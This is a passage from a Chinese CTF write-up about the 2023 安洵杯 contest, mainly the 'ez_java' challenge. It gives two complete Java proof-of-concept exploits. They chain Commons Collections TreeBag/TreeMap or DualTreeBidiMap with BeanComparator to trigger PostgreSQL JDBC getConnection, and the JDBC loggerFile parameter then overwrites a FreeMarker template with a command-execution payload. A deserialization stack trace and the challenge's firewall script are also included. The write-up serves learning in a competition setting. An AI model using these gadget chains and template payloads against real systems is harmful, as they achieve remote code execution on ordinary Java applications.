<span class="hljs-title class_">Luck</span>(<span class="hljs-string">&quot;eS&quot;</span>);<span class="hljs-variable">$b</span>-&gt;l1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<span class="hljs-variable">$a</span>-&gt;y1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Luck</span>(<span class="hljs-string">&quot;eS&quot;</span>);<span class="hljs-variable">$a</span>-&gt;y1-&gt;lll3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Good</span>(<span class="hljs-variable">$b</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));</code></pre></div><p>原生类遍历和读取文件，不想说了</p><p>给出官方wp中有趣的地方</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160010951.png" alt="image-20231225160010951"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160032682.png" alt="image-20231225160032682"></p><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p>看的最久的一道题，思路都对了，但是不会补链子，唉。。。。</p><p>因为前不久才看过羊城杯的那道<code>freemarker</code>，所以看到文件有<code>index.ftl</code>时，我就知道要用<code>freemarker</code>模板注入了</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160716321.png" alt="image-20231225160716321"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160502576.png" alt="image-20231225160502576"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160531450.png" alt="image-20231225160531450"></p><p>依赖挺少的，很容易有思路</p><h4 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h4><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-built_in">echo</span> <span class="hljs-variable">$D0g3CTF</span> &gt; /flag<span class="hljs-built_in">chmod</span> 444 /flag<span class="hljs-built_in">unset</span> D0g3CTFiptables -P INPUT ACCEPTiptables -Fiptables -Xiptables -Ziptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -m state --state NEW -j DROPiptables -P OUTPUT DROPiptables -n -Ljava -jar /app/ezjava.jar</code></pre></div><p>所以使用freemarker模板注入</p><p><code>postgresql</code>任意文件写入覆盖<code>index.ftl</code>的内容，进行freemarker模板注入</p><p>并且&#x2F;read路由是要readObject，</p><p><code>postgresql</code>的利用要配合cb链</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225161651950.png" alt="image-20231225161651950"></p><p>但是DriverManager没有继承序列化接口，</p><h4 id="getter"><a href="#getter" class="headerlink" title="getter"></a>getter</h4><p>CB链来调用<code>getter</code>方法来触发postgresql JDBC攻击，对应的getter方法为<code>BaseDataSource#getConnection</code>（给了提示）</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226231442673.png" alt="image-20231226231442673"></p><p>但是关键的<code>java.util.PriorityQueue</code>被禁了，那就要找替代类</p><div class="code-wrapper"><pre><code class="hljs markdown">/**<span class="hljs-bullet"> *</span> exec:347, Runtime (java.lang)<span class="hljs-bullet"> *</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">init</span>&gt;</span></span>:-1, a<span class="hljs-bullet"> *</span> newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> newInstance:62, NativeConstructorAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> newInstance:422, Constructor (java.lang.reflect)<span class="hljs-bullet"> *</span> newInstance:442, Class (java.lang)<span class="hljs-bullet"> *</span> getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<span class="hljs-bullet"> *</span> newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<span class="hljs-bullet"> *</span> getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<span class="hljs-bullet"> *</span> invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> invoke:62, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> invoke:497, Method (java.lang.reflect)<span class="hljs-bullet"> *</span> invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)<span class="hljs-bullet"> *</span> getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)<span class="hljs-bullet"> *</span> getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)<span class="hljs-bullet"> *</span> getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)<span class="hljs-bullet"> *</span> getProperty:464, PropertyUtils (org.apache.commons.beanutils)<span class="hljs-bullet"> *</span> compare:163, BeanComparator (org.apache.commons.beanutils)<span class="hljs-bullet"> *</span> siftDownUsingComparator:721, PriorityQueue (java.util)<span class="hljs-bullet"> *</span> siftDown:687, PriorityQueue (java.util)<span class="hljs-bullet"> *</span> heapify:736, PriorityQueue (java.util)<span class="hljs-bullet"> *</span> readObject:795, PriorityQueue (java.util)<span class="hljs-bullet"> *</span> invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> invoke:62, NativeMethodAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<span class="hljs-bullet"> *</span> invoke:497, Method (java.lang.reflect)<span class="hljs-bullet"> *</span> invokeReadObject:1058, ObjectStreamClass (java.io)<span class="hljs-bullet"> *</span> readSerialData:1900, ObjectInputStream (java.io)<span class="hljs-bullet"> *</span> readOrdinaryObject:1801, ObjectInputStream (java.io)<span class="hljs-bullet"> *</span> readObject0:1351, ObjectInputStream (java.io)<span class="hljs-bullet"> *</span> readObject:371, ObjectInputStream (java.io)<span class="hljs-bullet"> *</span> base64deserial:66, SerializeUtils (com.javasec.utils)<span class="hljs-bullet"> *</span> deserTester:312, SerializeUtils (com.javasec.utils)<span class="hljs-bullet"> *</span> main:22, cb1 (com.javasec.pocs.cb) <span class="hljs-emphasis">*/</span></code></pre></div><p><code>BeanComparator</code>调用的是<code>compare</code>方法，要找类进行替代</p><h3 id="TreeMap-TreeBag-–强大的Boogipop大佬"><a href="#TreeMap-TreeBag-–强大的Boogipop大佬" class="headerlink" title="TreeMap&#x2F;TreeBag       –强大的Boogipop大佬"></a>TreeMap&#x2F;TreeBag       –强大的Boogipop大佬</h3><p>TreeBag的readObject</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225172848202.png" alt="image-20231225172848202"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173022808.png" alt="image-20231225173022808"></p><p>TreeMap的put</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173116722.png" alt="image-20231225173116722"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173148534.png" alt="image-20231225173148534"></p><p>使<code>comparator</code>为<code>BeanComparator</code>即可</p><h4 id="getter-1"><a href="#getter-1" class="headerlink" title="getter"></a>getter</h4><p>找到的是<code>pgConnectionPoolDataSource</code>，他是抽象类<code>BaseDataSource</code>的实现类，而<code>BaseDataSource</code>存在<code>getConnection</code></p><p>是继承<code>BaseDataSource</code>的都行</p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-type">PGConnectionPoolDataSource</span> <span class="hljs-variable">pgConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGConnectionPoolDataSource</span>();    <span class="hljs-type">String</span> <span class="hljs-variable">loggerLevel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;debug&quot;</span>;    <span class="hljs-type">String</span> <span class="hljs-variable">loggerFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/app/templates/index.ftl&quot;</span>;    String shellContent=<span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span>+<span class="hljs-string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span>+<span class="hljs-string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span>+<span class="hljs-string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>;    System.out.println(shellContent);    <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:postgresql://&quot;</span>+<span class="hljs-string">&quot;123&quot;</span>+<span class="hljs-string">&quot;/aaaa?ApplicationName=&quot;</span>+<span class="hljs-string">&quot;123123123&quot;</span>+<span class="hljs-string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="hljs-string">&quot;&amp;loggerLevel=&quot;</span>+loggerLevel;    pgConnectionPoolDataSource.setURL(jdbcUrl);    pgConnectionPoolDataSource.setServerNames(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;shellContent&#125;);    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();    setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;connection&quot;</span>);    <span class="hljs-type">TreeBag</span> <span class="hljs-variable">treeBag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeBag</span>(comparator);    TreeMap&lt;Object,Object&gt; m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();    setFieldValue(m, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);    setFieldValue(m, <span class="hljs-string">&quot;modCount&quot;</span>, <span class="hljs-number">2</span>);    Class&lt;?&gt; nodeC = Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);    <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);    nodeCons.setAccessible(<span class="hljs-literal">true</span>);    <span class="hljs-type">Object</span> <span class="hljs-variable">MutableInteger</span> <span class="hljs-operator">=</span> createWithoutConstructor(<span class="hljs-string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);    <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, <span class="hljs-literal">null</span>);    <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);    setFieldValue(node, <span class="hljs-string">&quot;right&quot;</span>, right);    setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);    setFieldValue(m, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);    setFieldValue(treeBag,<span class="hljs-string">&quot;map&quot;</span>,m);    System.out.println(base64serial(treeBag));    deserTester(treeBag);&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);    oos.writeObject(o);    oos.close();    <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());    <span class="hljs-keyword">return</span> base64String;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">base64deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    ois.readObject();    ois.close();&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserTester</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;    base64deserial(base64serial(o));&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">createWithoutConstructor</span><span class="hljs-params">(String classname)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-keyword">return</span> createWithoutConstructor(Class.forName(classname));&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithoutConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithConstructor</span><span class="hljs-params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="hljs-built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;    Constructor&lt;? <span class="hljs-built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);    objCons.setAccessible(<span class="hljs-literal">true</span>);    Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);    sc.setAccessible(<span class="hljs-literal">true</span>);    <span class="hljs-keyword">return</span> (T) sc.newInstance(consArgs);&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-keyword">try</span> &#123;        field = clazz.getDeclaredField(fieldName);        field.setAccessible(<span class="hljs-literal">true</span>);    &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;        <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)            field = getField(clazz.getSuperclass(), fieldName);    &#125;    <span class="hljs-keyword">return</span> field;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);    field.setAccessible(<span class="hljs-literal">true</span>);    <span class="hljs-keyword">if</span>(field != <span class="hljs-literal">null</span>) &#123;        field.set(obj, value);    &#125;&#125;</code></pre></div><h4 id="分析流程-（以TemplatesImpl的getter讲解）"><a href="#分析流程-（以TemplatesImpl的getter讲解）" class="headerlink" title="分析流程  （以TemplatesImpl的getter讲解）"></a>分析流程  （以TemplatesImpl的getter讲解）</h4><p>先看看代替<code>PriorityQueue</code>的这部分</p><div class="code-wrapper"><pre><code class="hljs">TreeBag treeBag = new TreeBag(comparator);TreeMap&lt;Object,Object&gt; m = new TreeMap&lt;&gt;();setFieldValue(m, &quot;size&quot;, 2);setFieldValue(m, &quot;modCount&quot;, 2);Class&lt;?&gt; nodeC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);nodeCons.setAccessible(true);Object MutableInteger = createWithoutConstructor(&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;);Object node = nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, null);Object right = nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);setFieldValue(node, &quot;right&quot;, right);setFieldValue(m, &quot;root&quot;, node);setFieldValue(m, &quot;comparator&quot;, comparator);setFieldValue(treeBag,&quot;map&quot;,m);</code></pre></div><p>TreeBag调用父类doReadObject</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226104947897.png" alt="image-20231226104947897"></p><p>设置map为TreeMap，调用TreeMap的put方法</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105035662.png" alt="image-20231226105035662"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105133981.png" alt="image-20231226105133981"></p><p>令<code>comparator</code>为<code>BeanComparator</code>即可</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105150232.png" alt="image-20231226105150232"></p><p>以上大概就是执行流程，下面看看该如何写出poc</p><p>注意参数k1,k2要控制为<code>TemplatesImpl</code>类，往上可以追溯到</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105035662.png"></p><p>即obj应为<code>TemplatesImpl</code>类</p><p>并且前面也有个readObject</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113132550.png" alt="image-20231226113132550"></p><p>所以看看writeObject干了什么</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113437650.png" alt="image-20231226113437650"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113555944.png" alt="image-20231226113555944"></p><p>获取到的是TreeMap的comparator，因为后面要调用comparator.compare，所以comparator为<code>BeanComparator</code>，接着看</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226114031067.png" alt="image-20231226114031067"></p><p>跟进iterator()</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226163620650.png" alt="image-20231226163620650"></p><p>继续跟进getFirstEntry()</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226163843117.png" alt="image-20231226163843117"></p><p>要保证<code>doWriteObject</code>能够正常遍历，要使<code>root</code>的值为<code>java.util.TreeMap$Entry</code>的实例</p><p>不然无法遍历就无法<code>writeObject</code>，在<code>doReadObejct</code>时的<code>readObject</code>就会出现异常</p><p>并且前面<code>doReadObject</code>说了<code>obj=in.readObject</code>应为<code>TemplatesImpl</code>类，所以<code>root</code>的<code>key</code>应为我们构造的恶意<code>TemplatesImpl</code></p><p><code>root</code>的<code>value</code>因为要转化为<code>MutableInteger</code>类，所以我们传入<code>value</code>时直接传入<code>MutableInteger</code>类的实例即可 （转化不报错都行）</p><p>对应poc中的</p><div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; nodeC = Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);<span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);nodeCons.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">MutableInteger</span> <span class="hljs-operator">=</span> createWithoutConstructor(<span class="hljs-string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCons.newInstance(obj,MutableInteger, <span class="hljs-literal">null</span>);  <span class="hljs-comment">//obj为恶意的TemplatesImpl</span>setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);</code></pre></div><p>应该就差不多了</p><p>在调试过程中发现原来反射是只有在序列化时的赋值，对于反序列化过程，只有被<code>writeObject</code>等写入数据流的才能在反序列化中读取到数据</p><p>在这里，TreeMap和TreeBag能利用，实际上是相当于说他们的环境实际上已经配好了，我们就写入一些数据让他满足条件即可</p><p>比如</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226170004784.png" alt="image-20231226170004784"></p><p>这个map是<code>TreeMap</code>是因为</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226170040751.png" alt="image-20231226170040751"></p><p>而与我们的操作无关，我们控制的是<code>readObject</code>能获取的值</p><p>算了，不说了，说多了误导人</p><h3 id="DualTreeBidiMap"><a href="#DualTreeBidiMap" class="headerlink" title="DualTreeBidiMap"></a>DualTreeBidiMap</h3><h4 id="getter-2"><a href="#getter-2" class="headerlink" title="getter"></a>getter</h4><p><code>BaseDataSource</code>是抽象类，找到它的子类：<code>PGSimpleDataSource</code></p><p>其实都一样，找个<code>BaseDataSource</code>的实现类就行</p><h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<span class="hljs-keyword">import</span> org.apache.commons.collections.bidimap.AbstractDualBidiMap;<span class="hljs-keyword">import</span> org.apache.commons.collections.bidimap.DualTreeBidiMap;<span class="hljs-keyword">import</span> org.postgresql.ds.PGSimpleDataSource;<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayloads</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">String</span> <span class="hljs-variable">loggerLevel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;debug&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">loggerFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;templates/index.ftl&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">shellContent</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +                <span class="hljs-string">&quot;  &lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +                <span class="hljs-string">&quot;    &lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +                <span class="hljs-string">&quot;      &lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;&lt;#assign value=\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;java.io.FileReader\&quot;,\&quot;/flag\&quot;)&gt;$&#123;\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;java.util.Scanner\&quot;,value).useDelimiter(\&quot;\\\\Aasd\&quot;).next()&#125;&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="hljs-string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="hljs-string">&quot;&amp;&quot;</span>+shellContent;        <span class="hljs-type">PGSimpleDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PGSimpleDataSource</span>();        dataSource.setUrl(command);        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;connection&quot;</span>, String.CASE_INSENSITIVE_ORDER);        <span class="hljs-type">DualTreeBidiMap</span> <span class="hljs-variable">dualTreeBidiMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DualTreeBidiMap</span>();        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        map.put(dataSource, dataSource);        setValue(dualTreeBidiMap, <span class="hljs-string">&quot;comparator&quot;</span>, beanComparator);        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> AbstractDualBidiMap.class.getDeclaredField(<span class="hljs-string">&quot;maps&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        Map[] maps = (Map[]) field.get(dualTreeBidiMap);        maps[<span class="hljs-number">0</span>] = map;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);        objectOutputStream.writeObject(dualTreeBidiMap);        objectOutputStream.close();        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();        <span class="hljs-comment">// base64 poc</span>        System.out.println(Base64.getEncoder().encodeToString(byteArray));    &#125;&#125;</code></pre></div><h4 id="分析流程-（以TemplatesImpl的getter讲解）-1"><a href="#分析流程-（以TemplatesImpl的getter讲解）-1" class="headerlink" title="分析流程  （以TemplatesImpl的getter讲解）"></a>分析流程  （以TemplatesImpl的getter讲解）</h4><p>大体过程</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192143635.png" alt="image-20231226192143635"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192210514.png" alt="image-20231226192210514"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192244047.png" alt="image-20231226192244047"></p><p><img 